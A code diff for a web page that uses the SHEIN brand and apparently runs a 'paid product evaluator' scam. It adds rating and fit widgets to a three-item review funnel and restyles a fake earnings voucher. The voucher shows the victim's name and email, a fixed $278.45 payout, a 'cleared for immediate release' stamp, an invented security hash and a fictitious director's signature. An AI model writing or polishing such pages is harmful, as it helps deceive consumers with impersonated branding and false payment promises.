+    var container = document.getElementById("star-selector-wrap");
+    if (!container) return;
+    var btns = container.querySelectorAll(".shein-star-btn");
+    btns.forEach(function(b, idx) {
+      if (idx < stars) b.classList.add("active");
+      else b.classList.remove("active");
+    });
+    var label = document.getElementById("star-rating-label");
+    if (label) {
+      var map = {
+        1: "1.0 · Poor Quality",
+        2: "2.0 · Below Standard",
+        3: "3.0 · Average",
+        4: "4.5 · Highly Recommended",
+        5: "5.0 · Runway Standard ★"
+      };
+      label.textContent = map[stars] || (stars + ".0");
+    }
+  }
+
+  function setFitOption(btn, fitName) {
+    currentFit = fitName;
+    var chips = document.querySelectorAll(".shein-chip-btn");
+    chips.forEach(function(c) { c.classList.remove("selected"); });
+    if (btn) btn.classList.add("selected");
+  }
+
   // ─── Render post card (steps 1-3) ────────────────────────────────────────────
   function renderPost(n) {
     var p = POSTS[n];
     var nextKey = n === 1 ? "post_2" : (n === 2 ? "post_3" : "chat");
+    currentRating = 5;
+    currentFit = "True to Size";
+
+    var specsHtml = "";
+    if (p.specs && p.specs.length) {
+      specsHtml = '<div class="shein-specs-bar">' +
+        p.specs.map(function(s) {
+          return '<span class="shein-spec-pill">' + s + '</span>';
+        }).join('') +
+      '</div>';
+    }
+
     document.getElementById("post-card").innerHTML =
-      '<div class="shein-card-top">' +
-        '<div class="shein-brand-badge">' +
-          '<img alt="' + p.name + '" class="shein-brand-icon" src="' + p.logo + '">' +
-          '<div>' +
-            '<div class="shein-brand-title"><span>' + p.name + '</span><img src="images/verified.png" alt="Official"></div>' +
-            '<div class="shein-sku-line"><span>' + p.sku + '</span> · <span class="shein-tag-mini">' + p.badge + '</span></div>' +
+      '<div class="shein-product-container">' +
+        '<div class="shein-card-top">' +
+          '<div class="shein-brand-badge">' +
+            '<img alt="' + p.name + '" class="shein-brand-icon" src="' + p.logo + '">' +
+            '<div>' +
+              '<div class="shein-brand-title"><span>' + p.name + '</span><img src="images/verified.png" alt="Official"></div>' +
+              '<div class="shein-sku-line"><span>' + p.sku + '</span> · <span class="shein-tag-mini">' + p.badge + '</span></div>' +
+            '</div>' +
+          '</div>' +
+          '<div class="shein-free-returns"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"></polyline></svg> Free Returns</div>' +
+        '</div>' +
+        '<div class="shein-product-image-wrap">' +
+          '<img alt="' + p.name + '" class="shein-product-media" decoding="async" fetchpriority="high" src="' + p.image + '">' +
+          '<span class="shein-overlay-tag">' + p.category + '</span>' +
+          '<span class="shein-overlay-counter">Photo 1 of 3</span>' +
+        '</div>' +
+        specsHtml +
+        '<div class="shein-price-bar">' +
+          '<div class="shein-price-left">' +
+            '<span class="shein-curr-price">' + p.price + '</span>' +
+            '<span class="shein-old-price">' + p.oldPrice + '</span>' +
+            '<span class="shein-discount-tag">' + p.discount + '</span>' +
+          '</div>' +
+          '<div class="shein-rating-badge">' +
+            '<span class="text-[#f59e0b] text-sm font-bold">★★★★★</span>' +
+            '<span class="text-xs text-gray-500 font-semibold">(' + p.rating + ')</span>' +
           '</div>' +
         '</div>' +
-        '<div class="shein-free-returns"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"></polyline></svg> Free Returns</div>' +
-      '</div>' +
-      '<div class="shein-product-image-wrap">' +
-        '<img alt="' + p.name + '" class="shein-product-media" decoding="async" fetchpriority="high" src="' + p.image + '">' +
-        '<span class="shein-overlay-tag">' + p.category + '</span>' +
-      '</div>' +
-      '<div class="shein-price-bar">' +
-        '<div class="shein-price-left">' +
-          '<span class="shein-curr-price">' + p.price + '</span>' +
-          '<span class="shein-old-price">' + p.oldPrice + '</span>' +
-          '<span class="shein-discount-tag">' + p.discount + '</span>' +
-        '</div>' +
-        '<div class="shein-rating-badge">' +
-          '<span class="text-[#FFB800] text-sm font-bold">★★★★★</span>' +
-          '<span class="text-xs text-gray-500 font-semibold">(' + p.rating + ')</span>' +
-        '</div>' +
-      '</div>' +
-      '<div class="shein-product-copy">' + p.text + '</div>' +
-      '<div class="shein-survey-box">' +
-        '<div class="shein-survey-kicker">Reviewer Assessment · Item ' + n + ' of 3</div>' +
-        '<div class="shein-survey-question">' + p.question + '</div>' +
-        '<div class="shein-votes">' +
-          '<button type="button" onclick="vote()" class="shein-vote shein-vote-secondary" data-funnel-step="' + nextKey + '">' +
-            '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>' +
-            '<span>' + p.voteNo + '</span>' +
-          '</button>' +
-          '<button type="button" onclick="vote()" class="shein-vote shein-vote-primary" data-funnel-step="' + nextKey + '">' +
-            '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>' +
-            '<span>' + p.voteYes + '</span>' +
-          '</button>' +
+        '<div class="shein-product-copy">' + p.text + '</div>' +
+        '<div class="shein-survey-box">' +
+          '<div class="shein-survey-kicker">Reviewer Assessment · Item ' + n + ' of 3</div>' +
+          '<div class="shein-survey-question">' + p.question + '</div>' +
+
+          '<!-- Interactive 5-Star Rating Widget -->' +
+          '<div style="margin-bottom:6px;">' +
+            '<div style="font-size:11px;font-weight:700;color:#6b7280;text-transform:uppercase;letter-spacing:0.04em;margin-bottom:6px;">Tap to Rate Overall Quality:</div>' +
+            '<div id="star-selector-wrap" class="shein-star-selector">' +
+              '<button type="button" class="shein-star-btn active" onclick="setStarRating(1)" aria-label="1 star">★</button>' +
+              '<button type="button" class="shein-star-btn active" onclick="setStarRating(2)" aria-label="2 stars">★</button>' +
+              '<button type="button" class="shein-star-btn active" onclick="setStarRating(3)" aria-label="3 stars">★</button>' +
+              '<button type="button" class="shein-star-btn active" onclick="setStarRating(4)" aria-label="4 stars">★</button>' +
+              '<button type="button" class="shein-star-btn active" onclick="setStarRating(5)" aria-label="5 stars">★</button>' +
+              '<span id="star-rating-label" class="shein-star-label">5.0 · Runway Standard ★</span>' +
+            '</div>' +
+          '</div>' +
+
+          '<!-- Fit & Material Assessment Chips -->' +
+          '<div class="shein-fit-chips">' +
+            '<button type="button" class="shein-chip-btn selected" onclick="setFitOption(this, \'True to Size\')">True to Size ✓</button>' +
+            '<button type="button" class="shein-chip-btn" onclick="setFitOption(this, \'Runs Small\')">Runs Small</button>' +
+            '<button type="button" class="shein-chip-btn" onclick="setFitOption(this, \'Relaxed Fit\')">Relaxed Fit</button>' +
+          '</div>' +
+
+          '<div class="shein-votes">' +
+            '<button type="button" onclick="vote()" class="shein-vote shein-vote-secondary" data-funnel-step="' + nextKey + '">' +
+              '<span>' + p.voteNo + '</span>' +
+            '</button>' +
+            '<button type="button" onclick="vote()" class="shein-vote shein-vote-primary" data-funnel-step="' + nextKey + '">' +
+              '<span>' + p.voteYes + '</span>' +
+            '</button>' +
+          '</div>' +
         '</div>' +
       '</div>';
     applyTwemoji(document.getElementById("post-card"));
@@ -1098,19 +1484,20 @@
     var now = new Date();
     var date = String(now.getMonth() + 1).padStart(2, "0") + "/" + String(now.getDate()).padStart(2, "0") + "/" + now.getFullYear();
     row.innerHTML = getAgentAvatarHtml() +
-      '<article class="support-receipt">' +
-        '<div class="support-receipt-head"><div class="support-receipt-brand"><img class="support-receipt-logo" src="images/shein-icon.svg" alt="" style="width:24px;height:24px;object-fit:contain;"><span>SHEIN VIP</span></div><span>Ref. ' + ref + '</span></div>' +
-        '<div class="support-receipt-title">Evaluator Earnings Receipt</div>' +
-        '<div class="support-receipt-body">' +
-          '<div class="support-receipt-parties"><div><div class="support-receipt-blue">From</div><strong>SHEIN VIP Services Ltd.</strong><div class="support-receipt-muted">Los Angeles, California</div></div><div class="support-receipt-to"><div class="support-receipt-blue">To</div><strong>' + escapeSupportText(supportName || "—") + '</strong><div class="support-receipt-muted">' + escapeSupportText(supportEmail || "—") + '</div></div></div>' +
-          '<div class="support-receipt-table"><div class="support-receipt-table-row support-receipt-table-head"><span>Description</span><span>Qty</span><span>Total</span></div><div class="support-receipt-table-row support-receipt-table-value"><span>Product Evaluation Payout (Batch #3)</span><span>3</span><span>$278.45</span></div></div>' +
-          '<div class="support-receipt-total"><span>Total</span><strong>$278.45</strong></div>' +
-          '<div class="support-receipt-details"><div><div><strong>Ref.</strong> ' + ref + '</div><div><strong>Issued:</strong> ' + date + '</div><div class="support-receipt-muted">This voucher confirms the approved evaluator compensation.</div></div><div class="support-receipt-sign"><div class="support-receipt-signature">Elena Vance</div><strong>Review Operations Director</strong><div class="support-receipt-muted">SHEIN VIP Program</div></div></div>' +
-          '<div class="support-receipt-method"><strong>Payout method:</strong> Direct Deposit / Bank Transfer</div>' +
-        '</div><div class="support-receipt-foot">' +
+      '<article class="support-receipt" style="box-shadow:0 12px 30px rgba(0,0,0,0.18);border:1px solid #e5e7eb;border-radius:16px;">' +
+        '<div class="support-receipt-head" style="background:#111111;padding:12px 14px;"><div class="support-receipt-brand"><img class="support-receipt-logo" src="images/shein-icon.svg" alt="" style="width:24px;height:24px;object-fit:contain;"><span style="letter-spacing:1px;font-weight:900;">SHEIN VIP</span></div><span style="font-size:10.5px;opacity:0.85;">Ref. ' + ref + '</span></div>' +
+        '<div class="support-receipt-title" style="background:#1f2937;color:white;font-size:18px;letter-spacing:-0.01em;padding:12px 14px;border-bottom:1px solid rgba(255,255,255,0.1);">Evaluator Compensation Voucher</div>' +
+        '<div class="support-receipt-body" style="padding:14px;">' +
+          '<div class="support-receipt-parties"><div><div class="support-receipt-blue" style="color:#6b7280;font-size:10px;text-transform:uppercase;">Issuing Entity</div><strong>SHEIN VIP Services Ltd.</strong><div class="support-receipt-muted">Los Angeles, CA</div></div><div class="support-receipt-to"><div class="support-receipt-blue" style="color:#6b7280;font-size:10px;text-transform:uppercase;">Authorized Recipient</div><strong>' + escapeSupportText(supportName || "—") + '</strong><div class="support-receipt-muted">' + escapeSupportText(supportEmail || "—") + '</div></div></div>' +
+          '<div class="support-receipt-table" style="margin-top:14px;"><div class="support-receipt-table-row support-receipt-table-head" style="background:#f3f4f6;color:#111827;border-radius:6px;"><span>Task Breakdown</span><span>Qty</span><span>Total</span></div><div class="support-receipt-table-row support-receipt-table-value" style="border-bottom:2px solid #111111;"><span>Product Evaluation Payout (Batch #3)</span><span>3</span><span>$278.45</span></div></div>' +
+          '<div class="support-receipt-total" style="padding:12px 0 8px;"><span>Total Approved:</span><strong style="color:#059669;font-size:24px;font-weight:900;">$278.45</strong></div>' +
+          '<div style="text-align:center;margin:8px 0 12px;"><span style="display:inline-block;border:1.5px solid #059669;color:#059669;font-weight:900;font-size:10.5px;padding:3px 10px;border-radius:6px;letter-spacing:0.08em;text-transform:uppercase;background:#ecfdf5;">✓ CLEARED FOR IMMEDIATE RELEASE</span></div>' +
+          '<div class="support-receipt-details" style="border-top:1px dashed #d1d5db;padding-top:12px;"><div><div><strong>Ref:</strong> ' + ref + '</div><div><strong>Issued:</strong> ' + date + '</div><div class="support-receipt-muted" style="font-size:10px;">Security Hash: #SHP-VOUCHER-VALID</div></div><div class="support-receipt-sign"><div class="support-receipt-signature" style="font-size:18px;">Elena Vance</div><strong style="font-size:11px;">Director of Review Operations</strong><div class="support-receipt-muted" style="font-size:10px;">SHEIN Global VIP</div></div></div>' +
+          '<div class="support-receipt-method" style="margin-top:10px;padding-top:8px;font-size:11px;color:#4b5563;"><strong>Settlement Channel:</strong> Direct Deposit / Card Link</div>' +
+        '</div><div class="support-receipt-foot" style="background:#111111;padding:12px;">' +
           '<div class="receipt-foot-brand">' +
             '<img src="images/shein-icon.svg" width="18" height="18" alt="SHEIN">' +
-            '<div class="receipt-foot-text"><span class="receipt-foot-name" style="letter-spacing:1px;font-weight:900;">SHEIN</span><span class="receipt-foot-sub" style="color:var(--shein-coral);">VIP EVALUATOR</span></div>' +
+            '<div class="receipt-foot-text"><span class="receipt-foot-name" style="letter-spacing:1px;font-weight:900;color:#ffffff;">SHEIN</span><span class="receipt-foot-sub" style="color:var(--shein-coral);font-weight:800;">VIP EVALUATOR SYSTEM</span></div>' +
           '</div>' +
         '</div>' +
       '</article>';
